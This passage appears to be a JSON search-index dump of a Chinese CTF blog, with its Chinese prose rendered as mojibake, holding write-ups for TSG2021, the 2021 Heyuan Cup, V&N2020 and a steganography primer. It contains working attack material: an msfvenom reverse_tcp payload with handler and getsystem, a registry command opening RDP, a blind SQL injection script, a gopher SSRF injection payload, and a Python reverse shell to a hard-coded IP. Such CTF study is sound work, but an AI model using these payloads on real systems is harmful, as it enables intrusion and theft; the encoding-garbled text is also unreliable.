·è¿›è¡Œè¯»å–æ–‡ä»¶çš„æ“ä½œï¼Œé‚£ä¹ˆè¿™å°±æ„å‘³ç€ï¼Œæˆ‘ä»¬åªéœ€è¦å¯¹é¦–å­—æ¯è¿›è¡Œçˆ†ç ´å³å¯å‚è€ƒ:https://blog.csdn.net/bylfsj/article/details/102771173 ç„¶åå¯»æ‰¾é…ç½®æ–‡ä»¶ä¹‹ç±»çš„è¿›è¡Œè¯»å–ï¼Œæœ€åå†åŒ…å«xamppçš„ apache_start.batæ–‡ä»¶æˆåŠŸï¼š?win=..\\..\\t&lt;\\apache_start.batã€‚ è¯»å–php.iniæ–‡ä»¶ï¼š?win=..\\..\\t&lt;\\php\\phpi.iniï¼Œå‘ç°äº†è·¯å¾„ï¼šC:\\THIS_IS_A_SECRET_PATH_107B1177348CC063A0713838282B1C27892D5FE2\\ ç„¶åsessionæ–‡ä»¶ä¸Šä¼ ï¼Œä½†æ˜¯é¢˜ç›®æœ¬æ¥è¯´ä¸å¯ä»¥çš„ï¼Œæ‰€ä»¥åº”è¯¥å°±æ˜¯éé¢„æœŸè§£äº†ç„¶åæœ¬åœ°ç”Ÿæˆmsfé©¬ msfvenom -p windows/meterpreter/reverse_tcp lhost=xx.xx.xx.xx lport=5555 -f exe -o shell.exe å¹¶åœ¨æœåŠ¡å™¨è¿›è¡Œç›‘å¬ Use exploit/multi/handlerSet payload windows/meterpreter/reverse_tcpSet lhost 0.0.0.0Set lport 5555Run ä½¿ç”¨getsystemè¿›è¡Œææƒç™»å½•ç•Œé¢ï¼Œå› ä¸ºè¦æˆªå›¾ REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f screenshotæ²¡æœ‰æƒé™ã€‚æ‰“å¼€3389ç«¯å£ï¼Œä¿®æ”¹administratorå¯†ç ï¼š å³å¯åœ¨æ¡Œé¢ä¸Šçœ‹åˆ°flag RevengePHP","link":"/2021/10/05/TSG2021/"},{"title":"2021é¹¤åŸæ¯","text":"å‰è¨€ä»Šå¤©æ»¡è¯¾äº†ï¼ŒæŠ½æ—¶é—´æ‰“äº†ä¸€ä¸‹é¹¤åŸæ¯ï¼Œwebåšäº†ä¸¤é¢˜ï¼Œç¬¬ä¸‰é¢˜æ„Ÿè§‰å¯ä»¥åšçš„ï¼Œå› ä¸ºåœ¨å»ä¸Šè¯¾çš„è·¯ä¸ŠæŸ¥åˆ°äº†bypassçš„æ‰‹æ³•ï¼Œä¸è¿‡åé¢å­¦é•¿ä¹Ÿåšå‡ºæ¥äº†ï¼Œtqlï¼Œç„¶ååšäº†ä¸¤é¢˜æµé‡å–è¯çš„miscï¼Œè¿˜ä¸é”™ï¼Œè¿™é‡Œå°±å°±è´´ä¸€ä¸‹è‡ªå·±åšå‡ºæ¥çš„å‡ é¢˜ï¼Œé¡ºä¾¿è®°å½•ä¸€ä¸‹å…¶ä»–æ²¡åšå‡ºæ¥çš„é¢˜ middle_magicè€ƒçƒ‚çš„phpé»‘é­”æ³• æµé‡å–è¯ç›²æ³¨æ‰¾flag flag{w1reshARK_ez_1sntit} easy_sql_2æ‹¿äº†ä¸€ä¸ªåè¡€ï¼Œä½†æ˜¯æ„Ÿè§‰å¯ä»¥æ›´å¿«çš„ï¼Œå¯æƒœæ—©ä¸Šæœ‰è¯¾ è¿‡æ»¤äº†selectï¼Œè”æƒ³åˆ°å †å æˆ–è€…mysql8.0çš„tableæµ‹è¯•äº†ä¸€ä¸‹å‘ç°æ˜¯mysql8.0ï¼Œæ•…ç”¨tableè¿›è¡Œæ³¨å…¥ def sql_injection(pay_lo):#åº“åå’Œç‰ˆæœ¬ fina_wod=&quot;&quot; for i in range(1,100): low=32 high=128 mid=(low+high)//2 while(low&lt;high): payload_1=f&quot;admin'and ascii(substr(({payload}),{i},1))&gt;{mid}#&quot;.replace(&quot; &quot;,&quot;/**/&quot;) data={ 'username':payload_1, 'password':&quot;1&quot; } #print(data) r=s.post(url=url,data=data).text print(r) if &quot;password error!&quot; in r: low = mid + 1 else: high = mid mid = (low + high) // 2 if (mid == 32 or mid == 128): break fina_wod += chr(mid) print(fina_wod)def sql_injection_s():#è¡¨å fina_wod=&quot;&quot; a=&quot;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz&quot; for i in range(0,100): for j in range(0,62): #payload_2=f&quot;admin'and (('def','ctf','{fina_wod+a[j]}','',1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1)&lt;(table information_schema.tables order by TABLE_SCHEMA limit 1,1))#&quot;.replace(&quot; &quot;,&quot;/**/&quot;) payload_2=f&quot;admin'and ('ctf','{fina_wod+a[j]}',1,1,1,1)&lt;(table mysql.innodb_table_stats order by database_name limit 1,1)#&quot;.replace(&quot; &quot;,&quot;/**/&quot;) data={ 'username':payload_2, 'password':&quot;1&quot; } r = s.post(url=url, data=data).text print(payload_2) print(r) if &quot;username error&quot; in r: fina_wod+=a[j-1] print(fina_wod) breakdef search_co():#æ¢æµ‹è¡¨åœ¨ç¬¬å‡ ä¸ª for i in range(0,10000): #payload=f&quot;admin'and/**/('def','ct',1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1)&lt;(table information_schema.tables order by table_schema desc limit {i},1)#&quot;.replace(&quot; &quot;,&quot;/**/&quot;) payload=f&quot;admin'and/**/('ct',1,1,1,1,1)&lt;(table mysql.innodb_table_stats order by database_name limit {i},1)#&quot;.replace(&quot; &quot;,&quot;/**/&quot;) data1={ 'username':payload, 'password':&quot;123&quot; } #print(data1) #print(s.post(url=url,data=data1).text) if &quot;username error!&quot; in s.post(url=url,data=data1).text: print(&quot;ctfåº“åœ¨ç¬¬&quot;,i,&quot;åˆ—&quot;)if __name__==&quot;__main__&quot;: #payload=&quot;database()&quot;#ctf #payload=&quot;version()&quot;#8.0.26-0ubuntu0.20.04.2 payload=&quot;table fl11aag limit 1,1&quot; #search_co() #print_word() sql_injection(payload) #sql_injection_s() misc ä¾æ—§æ˜¯ç›²æ³¨æ‰¾flagï¼Œæ²¡å•¥å¥½è¯´çš„ï¼Œä¸è¿‡å‰é¢çš„å¥½åƒæ˜¯å›¾ç‰‡éšå†™å•¥çš„ï¼Œæ²¡åšå‡ºæ¥ï¼Œxyå¤§ä½¬å‘ç»™æˆ‘çš„è¿™ä¸ªæµé‡å–è¯çš„ 99,100,50,99,51,101,50,102,101,97,52,54,51,100,101,100,57,97,102,56,48,48,100,55,49,53,53,98,101,55,97,113,125 easypåŒæ ·æ˜¯é»‘é­”æ³• &lt;?phpinclude 'flag.php';if (isset($_POST['guess'])) { $guess = (string) $_POST['guess']; if ($guess === $secret) { $message = 'Congratulations! The flag is: ' . $flag; } else { $message = 'Wrong. Try Again'; }}if (preg_match('/utils\\.php\\/*$/i', $_SERVER['PHP_SELF'])) { exit(&quot;hacker :)&quot;);}if (preg_match('/show_source/', $_SERVER['REQUEST_URI'])){ exit(&quot;hacker :)&quot;);}if (isset($_GET['show_source'])) { highlight_file(basename($_SERVER['PHP_SELF'])); exit();}else{ show_source(__FILE__);} ç¬¬ä¸€ä¸ªç”¨%0aæˆ–è€…%0dç»•è¿‡ï¼Œä¸€å¼€å§‹æˆ‘ç”¨%0aå¯ä»¥ï¼Œåæ¥ç”¨%0dæ‰å¯ä»¥ï¼Œéƒ½æ”¾åœ¨utils.phpçš„åé¢ç„¶åç¬¬äºŒä¸ªä½¿ç”¨urlçš„ä¸€ä¸ªæ£€æµ‹æœºåˆ¶ç»•è¿‡è®¿é—®è¿™ä¸ªæ˜¯å­¦é•¿çš„æˆªå›¾äº†ï¼Œæ”¾åœ¨è¿™é‡Œè®°å½•ä¸€ä¸‹ springè¿™é¢˜ä¹Ÿæ˜¯å­¦é•¿åšçš„ï¼Œä¸è¿‡è¯´æ˜¯åŸé¢˜ Spring Web Flowæ¡†æ¶è¿œç¨‹ä»£ç æ‰§è¡Œ(CVE-2017-4971) https://juejin.cn/post/7006672559714336805 easy_sql_1å”¯ä¸€æ²¡åšå‡ºæ¥çš„ä¸€é¢˜ä¸€å¼€å§‹ä»¥ä¸ºæ˜¯ssrfæ‰“mysqlï¼Œåæ¥å‘ç°æ€ä¹ˆæ‰“éƒ½ä¸è¡Œï¼Œç„¶åèµ›åé—®å…¶ä»–å¸ˆå‚…ï¼Œè¯´æ˜¯è¦æ‰“index.phpé‚£ä¸ªé¡µé¢ï¼Œè´´ä¸€ä¸‹flag a = &quot;admin')and (extractvalue(1,concat(0x7e,(select group_concat(flag) from flag),0x7e)))#&quot;a = quote(base64.b64encode(a.encode(&quot;utf-8&quot;)))payload = f'''gopher%3a%2f%2f127.0.0.1%3a80%2f_post%20%2findex.php%20http%2f1.1%250d%250ahost%3a%20localhost%3a80%250d%250acookie%3a%20phpsessid%3d25c1mm4b3ppn9ohr2gve7d4tg4%3bthis_is_your_cookie%3d{a}%250d%250aconnection%3a%20close%250d%250acontent-type%3a%20application%2fx-www-form-urlencoded%250d%250acontent-length%3a%2021%250d%250a%250d%250auname%3dadmin%26passwd%3dadmin''' è§£ç ä»¥åæ˜¯å°±æ˜¯ä½¿ç”¨gopherå‘é€postè¯·æ±‚åˆ°æœ¬åœ°çš„index.phpé¡µé¢ï¼Œç„¶åä½¿ç”¨admin/adminè¿›è¡Œç™»å½•ï¼Œå¹¶ä¸”æ³¨å…¥ç‚¹æ˜¯åœ¨cookieçš„ä½ç½®çš„ a = &quot;admin')and (extractvalue(1,concat(0x7e,(select group_concat(flag) from flag),0x7e)))#&quot;a = quote(base64.b64encode(a.encode(&quot;utf-8&quot;)))payload = f'''gopher://127.0.0.1:80/_post /index.php http/1.1host: localhost:80cookie: phpsessid=25c1mm4b3ppn9ohr2gve7d4tg4;this_is_your_cookie={a}connection: closecontent-type: application/x-www-form-urlencodedcontent-length: 21uname=admin&amp;passwd=admin'''","link":"/2021/10/08/2021%E9%B9%A4%E5%9F%8E%E6%9D%AF/"},{"title":"V&amp;N2020","text":"HappyCTFdctfdæ¼æ´ cve-2020-7245 CheckInè€ƒç‚¹ï¼š 1.æ— å›æ˜¾rce 2.æ–‡ä»¶æè¿°ç¬¦åˆ†ææºç : from flask import Flask, requestimport osapp = Flask(__name__)flag_file = open(&quot;flag.txt&quot;, &quot;r&quot;)# flag = flag_file.read()# flag_file.close()## @app.route('/flag')# def flag():# return flag## want flag? naive!# You will never find the thing you want:) I think@app.route('/shell')def shell(): os.system(&quot;rm -f flag.txt&quot;) exec_cmd = request.args.get('c') os.system(exec_cmd) return &quot;1&quot;@app.route('/')def source(): return open(&quot;app.py&quot;,&quot;r&quot;).read()if __name__ == &quot;__main__&quot;: app.run(host='0.0.0.0') æˆ‘ä»¬å…ˆåˆ†æä¸‹å‡ ä¸ªè·¯ç”±ï¼Œå¾ˆæ˜æ˜¾ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨shellè¿™ä¸ªè·¯ç”±æ‰§è¡Œå‘½ä»¤ï¼Œä½†æ˜¯ä»–æ˜¯æ— å›æ˜¾çš„ï¼Œç„¶åæ¥ä¸‹æ¥æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œflag.txtè¿™ä¸ªæ–‡ä»¶ï¼Œä¼šå…ˆè¢«æ‰“å¼€ï¼Œç„¶åå†æ‰§è¡Œåˆ é™¤å‘½ä»¤ï¼Œæ‰€ä»¥è¦å¦‚ä½•è¯»åˆ°è¿™ä¸ªflagå‘¢ï¼Ÿæ–‡ä»¶æè¿°ç¬¦ä»€ä¹ˆæ˜¯æ–‡ä»¶æè¿°ç¬¦ï¼šå†…æ ¸åˆ©ç”¨æ–‡ä»¶æè¿°ç¬¦æ¥è®¿é—®æ–‡ä»¶ã€‚æ–‡ä»¶æè¿°ç¬¦æ˜¯éè´Ÿæ•´æ•°ã€‚æ‰“å¼€ç°å­˜æ–‡ä»¶æˆ–æ–°å»ºæ–‡ä»¶æ—¶ï¼Œå†…æ ¸ä¼šè¿”å›ä¸€ä¸ªæ–‡ä»¶æè¿°ç¬¦ã€‚è¯»å†™æ–‡ä»¶ä¹Ÿéœ€è¦ä½¿ç”¨æ–‡ä»¶æè¿°ç¬¦æ¥æŒ‡å®šå¾…è¯»å†™çš„æ–‡ä»¶ã€‚ ä¾‹å¦‚Pythonä¸­ï¼Œå½“æˆ‘ä»¬open()å‡½æ•°æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶æ—¶ä¾¿åˆ›å»ºäº†ä¸€ä¸ªæ–‡ä»¶æè¿°ç¬¦ï¼Œè€Œåå¯¹è¿™ä¸ªæ–‡ä»¶æè¿°ç¬¦ä½¿ç”¨read()å‡½æ•°ä¾¿æ˜¯è¯»å–æ–‡ä»¶æè¿°ç¬¦ä¸­çš„å†…å®¹ï¼Œclose()å‡½æ•°ç”¨äºå…³é—­/é”€æ¯è¿™ä¸ªæ–‡ä»¶æè¿°ç¬¦ã€‚ æ–‡ä»¶æè¿°ç¬¦å‚¨å­˜åœ¨ä»€ä¹ˆåœ°æ–¹ï¼š/proc/&lt;pid&gt;/fd&lt;id&gt; ä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡catè¿›ç¨‹ä¸­çš„fdæ¥è·å–åˆ°æ–‡ä»¶æè¿°ç¬¦ã€‚è€Œæ–‡ä»¶æè¿°ç¬¦ä¸­å°±å­˜å‚¨ç€è¯¥æ–‡ä»¶çš„å†…å®¹ æ— å›æ˜¾å‘½ä»¤æ‰§è¡Œï¼Œä¸€èˆ¬éƒ½æ˜¯è€ƒè™‘åå¼¹shellæ“ä½œï¼Œä½†æ˜¯è¿™é‡Œcurlç­‰ä¸€äº›å¸¸è§å‘½ä»¤éƒ½æ‰§è¡Œä¸äº†ï¼Œè¿™æœ‰è¿™ä¸ªå¯ä»¥ python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;110.42.133.120&quot;,9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);' æ¥ä¸‹æ¥å°±ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ cd /proclscd /proc/[pid]#è¿›ç¨‹æ•°å­—cd /porc/[pid]/fdcat [æ–‡ä»¶æè¿°ç¬¦æ•°å­—] è¿›è¡Œflagçš„æŸ¥æ‰¾å³å¯ å°ç»“è¿™é¢˜çš„è€ƒç‚¹è®©æˆ‘æ²¡æƒ³åˆ°çš„æ˜¯ï¼ŒåŸæ¥æ–‡ä»¶æè¿°ç¬¦é‡Œé¢å¯ä»¥å­˜å‚¨æ–‡ä»¶çš„ä¿¡æ¯ï¼Œåªè¦ä½ æœ‰å¯¹ä»–è¿›è¡Œæ“ä½œæ—¢æœ‰ï¼Œä»¥å‰éƒ½æ˜¯å…‰ç”¨ï¼Œæ²¡æƒ³åˆ°è¿™ä¸ª~ï¼Œç°åœ¨å°±æ˜äº†äº† TimeTravel&lt;?phperror_reporting(0);require __DIR__ . '/vendor/autoload.php';use GuzzleHttp\\Client;highlight_file(__FILE__);if(isset($_GET['flag'])) { $client = new Client(); $response = $client-&gt;get('http://127.0.0.1:5000/api/eligible'); $content = $response-&gt;getBody(); $data = json_decode($content, TRUE); if($data['success'] === true) { echo system('/readflag'); }}if(isset($_GET['file'])) { highlight_file($_GET['file']);}if(isset($_GET['phpinfo'])) { phpinfo();} æ‹¿åˆ°flagçš„æ¡ä»¶æ˜¯data[success]çš„æ¡ä»¶ä¸ºtrueï¼Œè¿™é‡Œæœ‰ä¸ªæ¼æ´å°±æ˜¯è¿™é¢˜çš„è€ƒç‚¹https://github.com/vulhub/vulhub/tree/master/cgi/httpoxyå¤§è‡´å°±æ˜¯ï¼Œå¦‚æœå®šä¹‰äº†ç¯å¢ƒå˜é‡http_proxyï¼Œphpå†…çš„http-apiå°±ä¼šèµ°è¿™ä¸ªä»£ç†ã€‚åœ¨è¿™ä¸ªphpinfoä¸­å°±å¼€å¯äº†cgiæ¨¡å¼äº†ï¼Œç„¶åå¯ä»¥åœ¨æœåŠ¡å™¨å†™å…¥éœ€è¦ä¼ å…¥çš„ä¸€ä¸ªtrueçš„å†…å®¹ï¼Œå¹¶åœ¨é¢˜ç›®é‚£è¾¹é…ç½®è¿™ä¸ªåœ°å€å³å¯æ”¶åˆ°æˆ‘ä»¬ä¼ å…¥çš„content HTTP/1.1 200 OKServer: nginx/1.14.2Date: Fri, 06 Mar 2020 18:27:31 GMTContent-Type: text/html; charset=UTF-8Connection: Keep-aliveContent-Length: 16{&quot;success&quot;:true}","link":"/2021/10/09/V-N2020/"},{"title":"miscå…¥é—¨","text":"å›¾ç‰‡æ–‡ä»¶å¤´ä¿®å¤å¸¸è§çš„å›¾ç‰‡æ ¼å¼æ–‡ä»¶å¤´å¦‚ä¸‹ï¼š æ–‡ä»¶ç±»å‹ æ–‡ä»¶å¤´ JPEG(jpg) FFD8FF PNG(png) 89504E47 GIF(gif) 47494638 BMP 424DC001 å…¶ä»–æ›´å¤šç±»å‹çš„æ–‡ä»¶å¤´è¯·çœ‹https://blog.csdn.net/qq_23100787/article/details/79040925 æ–¹æ³•ï¼šä»¥16è¿›åˆ¶çš„æ–¹å¼æ‰“å¼€æ–‡ä»¶ï¼Œåœ¨æ–‡ä»¶æœ€å¼€å§‹æ·»åŠ ç›¸åº”çš„æ–‡ä»¶å¤´ CRCæ ¡éªŒä¿®å¤ 3.å®½é«˜ä¿®å¤å¯¹äºpngæ ¼å¼çš„å›¾ç‰‡ï¼Œå®½é«˜çš„æ•°æ®ä½ç½®å¦‚å›¾ç‰‡æ‰€å±•ç¤ºçš„é‚£æ · å¦‚æœé‡åˆ°ç®€å•ä¸€ç‚¹çš„é¢˜ç›®ï¼Œå¯ä»¥ç›´æ¥å°è¯•ä¿®æ”¹å®½é«˜ï¼Œè¿™é‡Œå»ºè®®ä¸€èˆ¬é€‰æ‹©ä¿®æ”¹é«˜åº¦ï¼Œä¸€ç‚¹ç‚¹çš„æ”¹åŠ¨å³å¯ã€‚å¦‚æœéšæ„ä¿®æ”¹å®½åº¦ä¸€èˆ¬éƒ½æ˜¯ä¼šé€ æˆå›¾åƒé”™è¯¯çš„ã€‚ ä¸€ä¸ªç®€å•çš„æ£€æµ‹å®½é«˜æ˜¯å¦æœ‰è¯¯çš„æ–¹æ³•ï¼šåœ¨Windowsä¸‹èƒ½æ‰“å¼€çš„å›¾ç‰‡åœ¨linuxä¸‹ä¸èƒ½æ‰“å¼€ï¼Œå°±è¯´æ˜å¯èƒ½æ˜¯å®½é«˜å­˜åœ¨é—®é¢˜ æœ€æ­£ç¡®çš„æ–¹æ³•åˆ™æ˜¯é€šè¿‡crcå€¼çˆ†ç ´å®½é«˜ï¼Œç»™å‡ºå¤§ä½¬çš„è„šæœ¬ï¼ˆè®°ä¸å¾—æ˜¯å“ªé‡Œæ‰¾åˆ°çš„äº†ï¼‰ #!/usr/bin/env python#-*- coding:UTF-8 -*-import binasciiimport structimport oscrcbp = open(&quot;flag.png&quot;,&quot;rb&quot;).read()#å¡«æ–‡ä»¶åfor i in range(1024): for j in range(1024): data = crcbp[12:16] + struct.pack('&gt;i',i) + struct.pack('&gt;i',j) + crcbp[24:29] crc32 = binascii.crc32(data) &amp; 0xffffffff if crc32 == 0x4d614986 :#æ­¤å¤„å¡«CRCå€¼ print (i); print (j); print (hex(i),hex(j)) çˆ†ç ´å‡ºæ¥åä¿®æ”¹å³å¯ã€‚ å¯¹äºjpgæ ¼å¼çš„å›¾ç‰‡ä¹Ÿå­˜åœ¨å®½é«˜éšå†™ï¼Œæœ‰å¸ˆå‚…å†™çš„å¾ˆè¯¦ç»†äº†ï¼Œæ­¤å¤„ä¸å†èµ˜è¿°ã€‚æœ‰éœ€è¦çš„æœ‹å‹è¯·ç§»æ­¥ï¼šhttps://blog.csdn.net/u010391191/article/details/80811813 4.LSBéšå†™æœ‰å…³è¯¥éšå†™æ–¹å¼çš„åŸç†ç½‘ä¸Šå·²ç»æœ‰å¾ˆå¤šæ–‡ç« å†™è¿‡äº†ï¼Œæ­¤å¤„ç®€å•è¯´ä¸€ä¸‹åšé¢˜æ–¹æ³•ã€‚ å·¥å…·ï¼šstegsolveï¼ˆéœ€è¦javaç¯å¢ƒï¼‰ ç”¨è¯¥å·¥å…·æ‰“å¼€å›¾ç‰‡åï¼Œç‚¹å‡»ç„¶åæŒ‰ç…§å¦‚ä¸‹å›¾ç‰‡ç‚¹å‡»æœ€åç‚¹å‡»previewã€‚æœ‰æ—¶å€™ç‚¹previewæ²¡ç”¨ï¼Œéœ€è¦ç‚¹å‡»æœ€ä¸‹é¢çš„save textæˆ–è€…save binæ‰èƒ½å¾—å‡ºç»“æœã€‚è¿™å¼ å›¾åªæ˜¯ç»™å‡ºäº†ç¤ºä¾‹ï¼Œå…·ä½“åšé¢˜çš„æ—¶å€™å¯ä»¥å¤šè¯•ä¸€ä¸‹å’Œå…¶ä»–æŒ‰é”®çš„ç»„åˆã€‚ è¿˜æœ‰ä¸€ä¸ªæ¯”è¾ƒç®€å•çš„æ–¹æ³•ï¼Œç”¨zstegå·¥å…·ï¼Œéœ€è¦kalié‡Œé¢åœ¨çº¿å®‰è£…ï¼šgem install zsteg ä½¿ç”¨å‘½ä»¤æ ¼å¼ï¼šzsteg filename 5.å¯¹äºä¸¤å¼ ç›¸åŒå›¾ç‰‡çš„éšå†™1.ç›²æ°´å° ä¸¤å¼ ç›¸åŒçš„å›¾ç‰‡é¦–å…ˆè€ƒè™‘ç›²æ°´å°ã€‚ä½¿ç”¨æ–¹æ³•åŠè„šæœ¬ç§»æ­¥https://github.com/chishaxie/BlindWaterMark 2.ç»„åˆè¿›è¡Œä¸åŒè¿ç®—ï¼ˆandã€orã€xorç­‰ï¼‰ è¿˜æ˜¯ç”¨stegsolveï¼Œç‚¹å‡»ä¹‹åä¼šå†è®©ä½ æ‰“å¼€ä¸€å¼ å›¾ç‰‡ï¼Œæ­¤æ—¶éœ€è¦æ³¨æ„ä¸¤å¼ å›¾ç‰‡çš„æ‰“å¼€é¡ºåºä¸åŒï¼Œè¿ç®—çš„ç»“æœä¹Ÿä¸åŒï¼Œå®é™…æ“ä½œä¸­å°±éœ€è¦å„ä½æ¥å›è¯•ä¸€ä¸‹äº† 6.æ–‡ä»¶åˆ†ç¦»å¸¸ç”¨å·¥å…·ï¼šbinwalkã€formostã€dd binwalkï¼šå¯å¿«é€Ÿåˆ†è¾¨æ–‡ä»¶æ˜¯å¦ç”±å¤šä¸ªæ–‡ä»¶åˆå¹¶è€Œæˆï¼Œå¹¶å°†æ–‡ä»¶è¿›è¡Œåˆ†ç¦»ã€‚å¦‚æœåˆ†ç¦»æˆåŠŸä¼šåœ¨ç›®æ ‡æ–‡ä»¶çš„ç›®å½•ã€‚ åˆ†ææ–‡ä»¶ï¼šbinwalk filename åˆ†ç¦»æ–‡ä»¶ï¼šbinwalk -e filename formostå‘½ä»¤ï¼šformost filename -o è¾“å‡ºçš„ç›®å½•å å› æœ¬äººè¾ƒæ‡’ï¼Œæ‰€ä»¥ç”¨äº†ä¸€ä¸ªå¸ˆå‚…è¯´çš„æ–¹æ³•ï¼Œåœ¨ç”¨formoståˆ†ç¦»æ–‡ä»¶æ—¶å¾ˆæ–¹ä¾¿ï¼ˆä¸ç”¨æ•²å‘½ä»¤ï¼‰ã€‚å‚è€ƒé“¾æ¥ï¼šhttps://blog.csdn.net/qq_39368007/article/details/91129628 ddï¼šå½“æ–‡ä»¶è‡ªåŠ¨åˆ†ç¦»å‡ºé”™æˆ–è€…å› ä¸ºå…¶ä»–åŸå› æ— æ³•è‡ªåŠ¨åˆ†ç¦»æ—¶ä½¿ç”¨ psï¼šå¦‚æœä¸€ä¸ªå·¥å…·åˆ†ç¦»ä¸å‡ºæ¥ä¸€å®šè¦å¤šè¯•å‡ ç§ï¼Œå› ä¸ºæ¯ç§å·¥å…·åˆ†ç¦»æ–¹æ³•éƒ½æœ‰æ‰€å·®åˆ«ï¼Œéš¾å…ä¼šå‡ºç°åˆ†ç¦»ä¸å‡ºæ¥çš„æƒ…å†µã€‚ 7.äºŒç»´ç å–åè‰² æœ‰ä¸€é“é¢˜å°±æ˜¯å°†äºŒç»´ç é¢œè‰²å–åå†æ‰«æå¾—å‡ºç»“æœï¼Œè®°ä¸å¾—æ˜¯å“ªé‡Œçš„äº†ã€‚å…·ä½“æ“ä½œå¯ä»¥ç”¨windowsè‡ªå¸¦çš„ç”»å›¾å·¥å…·ï¼Œæ‰“å¼€å›¾ç‰‡ç„¶åç‚¹å‡»ä¸»é¡µçš„é€‰æ‹©é€‰ä¸­å›¾ç‰‡åå³é”®é€‰æ‹©åè‰²å½“ä½ å‘ç°äºŒç»´ç çš„ä¸‰ä¸ªå®šä½ç‚¹æ˜¯ç™½è‰²çš„æ—¶å€™ï¼Œå°±è¯´æ˜éœ€è¦è¿›è¡Œåè‰²æ“ä½œäº† 8.ä¸€äº›å…¶ä»–å¸¸ç”¨å·¥å…·ä»‹ç»é’ˆå¯¹jpgæ ¼å¼å›¾ç‰‡çš„éšå†™ï¼š steghide ç”¨æ³•ï¼š éšè—æ–‡ä»¶steghide embed -cf [å›¾ç‰‡æˆ–wavæ–‡ä»¶è½½ä½“] -ef [å¾…éšè—æ–‡ä»¶]steghide embed -cf 1.jpg -ef 1.txt æŸ¥çœ‹å›¾ç‰‡ä¸­åµŒå…¥çš„æ–‡ä»¶ä¿¡æ¯steghide info 1.jpg æå–å›¾ç‰‡ä¸­éšè—çš„æ–‡ä»¶steghide extract -sf 1.jpg stegdetectï¼ˆå¯æ£€æµ‹é€šè¿‡JSteg,JPHide,OutGuess,Invisible,F5,oppendX,Camouflageç­‰éšå†™å·¥å…·éšè—çš„ä¿¡æ¯ï¼‰ ç”¨æ³•ï¼š stegdetect xxx.jpg stegdetect -s æ•æ„Ÿåº¦ xxx.jpgexi stegbreakï¼ˆçˆ†ç ´å¯†ç ï¼‰stegbreak.exe -r rules.ini -f password.txt p -c hide.jpg jphide silenteyeï¼ˆä¸‹é¢ä¼šæœ‰ä¸€å®šçš„ä»‹ç»ï¼Œç”¨æ³•åŸºæœ¬ä¸€è‡´ï¼‰ éŸ³é¢‘éšå†™1.é’ˆå¯¹mp3æ–‡ä»¶çš„éšå†™å°†åˆ†åˆ«ä»‹ç»ä»¥ä¸‹å·¥å…·ï¼šAudacityã€MP3Stego Audacity ä¸€èˆ¬å¾—åˆ°é¢˜ç›®æ–‡ä»¶ï¼Œæ‰“å¼€å¬åˆ°æœ‰æ‚éŸ³é¦–é€‰ç”¨è¿™ä¸ªå·¥å…·æ‰“å¼€ã€‚ç®€å•çš„é¢˜ç›®å°±æ˜¯åœ¨åŸéŸ³é¢‘ä¸­åŠ å…¥äº†ä¸€æ®µæ‘©æ–¯å¯†ç ï¼Œé€šè¿‡è¿™ä¸ªå·¥å…·å¯ä»¥ç›´æ¥çœ‹å‡ºæ¥ ç„¶åè§£å¯†å³å¯ã€‚ éš¾ä¸€ç‚¹çš„é¢˜ç›®åˆ™æ˜¯å¯¹éŸ³é¢‘è¿›è¡Œé¢‘è°±åˆ†æï¼Œæ¯”å¦‚è¿™ç¯‡æ–‡ç« https://blog.csdn.net/vhkjhwbs/article/details/103036133è°ˆåˆ°çš„lookmeå’Œç”¨çœ¼ç›å»å€¾å¬è¿™ä¸¤é“é¢˜ã€‚ MP3Stego å¦‚æœmp3 æ–‡ä»¶å¬ä¸Šå»æ²¡æœ‰ä»€ä¹ˆå¥‡æ€ªçš„åœ°æ–¹ï¼Œé‚£ä¹ˆå°±è¯•è¯•ç”¨è¿™ä¸ªå·¥å…·ã€‚æ•™ç¨‹ï¼šhttps://blog.csdn.net/myloveprogrmming/article/details/52641916 ç”¨è¿™ä¸ªå·¥å…·ä¼šè¾“å…¥å¯†ç ï¼Œæœ‰æ—¶å€™é¢˜ç›®æ²¡æœ‰ç‰¹åˆ«æç¤ºå°±å¯ä»¥è¯•è¯•å¼±å£ä»¤ï¼Œæœ‰æ—¶å€™ç”šè‡³å°±æ˜¯é¢˜ç›®åå­—ã€‚ 2.é’ˆå¯¹wavæ–‡ä»¶çš„éšå†™å·¥å…·ï¼šsilenteye å°†æ–‡ä»¶æ‹–åˆ°é‡Œé¢ç‚¹å‡»decode ç®€å•çš„é¢˜ç›®æ­¤æ—¶å†ç‚¹å³ä¸‹è§’çš„decodeå°±èƒ½å‡ºç»“æœï¼Œç¨å¾®ç»•ç‚¹çš„å°±è¿˜éœ€è¦å‹¾é€‰è¿™é‡Œè¾“å…¥å¯†ç ï¼Œæˆ–è€…é€‰æ‹©æ­£ç¡®çš„typeï¼Œçœ‹å‡ºé¢˜äººçš„å¿ƒæ€äº†~ å½“ç„¶ï¼Œè¿™ä¸ªå·¥å…·è¿˜èƒ½å¯¹bmpã€jpgæ ¼å¼çš„éšå†™æ–‡ä»¶è¿›è¡Œè§£å¯† è§†é¢‘éšå†™1.é’ˆå¯¹mp4æ–‡ä»¶çš„éšå†™å·¥å…·ï¼šffmpegï¼ˆä¸€å¥—å¯ä»¥ç”¨æ¥è®°å½•ã€è½¬æ¢æ•°å­—éŸ³é¢‘ã€è§†é¢‘ï¼Œå¹¶èƒ½å°†å…¶è½¬åŒ–ä¸ºæµçš„å¼€æºè®¡ç®—æœºç¨‹åºã€‚ï¼‰ è¯¦ç»†ä½¿ç”¨æ•™ç¨‹ä»‹ç»ï¼šhttps://blog.csdn.net/Allyli0022/article/details/78355248 